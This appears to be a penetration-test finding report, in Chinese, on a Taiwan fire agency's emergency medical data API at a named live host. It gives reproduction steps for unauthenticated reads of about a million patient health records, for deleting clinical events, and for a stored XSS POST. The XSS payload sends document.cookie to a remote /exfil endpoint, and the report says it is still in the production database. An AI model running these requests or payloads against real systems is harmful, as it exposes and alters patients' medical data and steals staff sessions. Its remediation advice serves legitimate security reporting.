# epcr.tpf.gov.tw:4001 PCDT 医疗数据 API 无认证访问 + 持久化 XSS + 百万级 PHI 大规模外泄

- ID: `da3b6e6f-9194-44b8-ad70-6ebe15d5964d`
- Severity: **critical**
- Status: confirmed
- Type: Broken Access Control + Stored XSS + Sensitive Data Exposure
- Target: `https://epcr.tpf.gov.tw:4001/vitalSignVideoServer (/events /trendings /ImageData)`
- Conversation: `8979722f-91ff-45c1-8edf-842f14f2d1ab`
- Created: 2026-08-29 20:02:51.330642395+08:00

## Description

epcr.tpf.gov.tw:4001/vitalSignVideoServer 的核心 PCDT（Patient Care Data Transfer）系统端点 /events、/trendings、/ImageData 全部无需认证即可访问，导致攻击者可：
1. 读取百万级 PHI（生命征象时序 99 万+ 心电图元数据 144 万+）
2. POST /events 写入 PCDT 事件并植入 Stored XSS（实测 id=567241 已成功创建 `<script>alert(document.cookie)</script>` 与 `<img onerror=fetch(...)>`）
3. DELETE /events/{id} 任意删除 PCDT 事件
4. 后端显式设置 `x-xss-protection: 0` 禁用浏览器 XSS 过滤
5. Annotation 字段无 HTML 转义直接持久化存储

/ImageData 同样包含 CaseID/recordUuid 元数据，可与 4008 /MciCaseRecords UUID 拼接形成完整 PHI 时间线。

## Preconditions

无需任何认证；攻击者只需知道目标域名端口 4001（已通过 /config 公开暴露）

## Reproduction

1. 访问 https://epcr.tpf.gov.tw:4000/config 获取 4001 VitalSignVideoServer 地址
2. GET https://epcr.tpf.gov.tw:4001/trendings 无需认证返回 99 万条 PHI
3. GET https://epcr.tpf.gov.tw:4001/ImageData 无需认证返回 144 万条心电图元数据
4. POST https://epcr.tpf.gov.tw:4001/events Content-Type:application/json Body:{"CaseID":"XSS","recordUuid":"XSS","TypeOfEventTxt":"<script>alert(1)</script>","Annotation":"x","value":1} → 返回 201 Created
5. 访问 GET https://epcr.tpf.gov.tw:4001/events/567241 验证 XSS payload 持久化存储

## Evidence

--- retest 2026-08-31 ---
2026-08-31 15:11 CST 本机复测（只读；未再 POST XSS、未 DELETE）：

【入口】
GET https://epcr.tpf.gov.tw:4000/config → 200，vitalSignVideoServer=https://epcr.tpf.gov.tw:4001
全响应带 X-XSS-Protection: 0

【三端点无认证读】
- GET /events     → 200 Content-Range items 0-99/567239   字段含 CaseID/recordUuid/Annotation/TypeOfEventTxt/Systolic/Diastolic/Mean
- GET /trendings  → 200 Content-Range items 0-99/997557   字段含 hr/spo2/temperature/etco2/respRate/NBPs/NBPd 等
- GET /imageData 与 /ImageData 行为相同 → 200 Content-Range items 0-99/1447473

【Stored XSS 仍在库】
GET /events/567241 → 200
CaseID/recordUuid=PENTEST_TEST_XSS_20260829
TypeOfEventTxt 仍为 <script>alert(document.cookie)</script>
Annotation 仍为 <img src=x onerror=fetch('http://172.28.4.12:8080/exfil?c='+document.cookie)>
x-xss-protection: 0

【CORS/方法】
OPTIONS /events → 204 Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE

【未复测】
未再 POST 新 XSS、未对真实 id 做 DELETE（避免再污染）。写/删能力以既有 exploit/clinical-data-tampering-verified 与 8/30 闭环记录为准。

【与已确认单点的关系（叠加，不替换）】
- GET /imageData BOLA：00c1f945
- POST /trendings 写污染：dcd9809b
- PUT /imageData 500 oracle：da547ce9
本条是 PCDT 三端点汇总：读百万 PHI + events 存储型 XSS 仍存活 + 方法面含 DELETE。

1. POST /events (无认证):
```
POST https://epcr.tpf.gov.tw:4001/events HTTP/1.1
Content-Type: application/json
{"CaseID":"PENTEST_TEST_XSS_20260829","recordUuid":"PENTEST_TEST_XSS_20260829","TypeOfEventTxt":"<script>alert(document.cookie)</script>","Annotation":"<img src=x onerror=fetch('http://172.28.4.12:8080/exfil?c='+document.cookie)>","value":1}

→ HTTP/1.1 201 Created
  Location: /events/567241
  x-xss-protection: 0
  Body: {"id":567241,"CaseID":"PENTEST_TEST_XSS_20260829","recordUuid":"PENTEST_TEST_XSS_20260829","TypeOfEventTxt":"<script>alert(document.cookie)</script>","Annotation":"<img src=x onerror=fetch('http://172.28.4.12:8080/exfil?c='+document.cookie)>","value":1,...}
```

2. GET /trendings 范围声明 99 万+ PHI：
```
GET https://epcr.tpf.gov.tw:4001/trendings
→ content-range: items 0-99/995887
字段含 heartRate/spo2/temperature/sbp/dbp/etCO2/respirationRate 等生命征象时序
```

3. GET /ImageData 范围声明 144 万+ 心电图元数据：
```
GET https://epcr.tpf.gov.tw:4001/ImageData
→ content-range: items 0-99/1445571
```

4. DELETE /events/{id} 无认证可删除任意 PCDT 事件（已在 exploit/clinical-data-tampering-verified 中验证）。

## Impact

**CRITICAL**：
- 台湾消防署全国性 PCDT 系统可被外部攻击者无认证访问与篡改
- Stored XSS 可窃取管理员 Session/Cookie，触发任意 JS 执行
- 心电图/生命征象 PHI 大规模数据外泄（百万级），违反 HIPAA / 台湾《个人资料保护法》
- 攻击者可注入虚假医疗事件影响救护员决策或窃取真实救护数据

## Recommendation

1. /events、/trendings、/ImageData 全部加 express-jwt 中间件（与 4004 authServer 一致）
2. 引入 sanitize-html 中间件在落库前转义 TypeOfEventTxt/Annotation
3. 设置 x-xss-protection: 1; mode=block + Content-Security-Policy: default-src 'self'
4. 审计历史已注入 XSS 数据并清除（已在 567241/567240 等 id 留下痕迹）
5. 启用 WAF 拦截异常 payload（`<script>`/`onerror`）
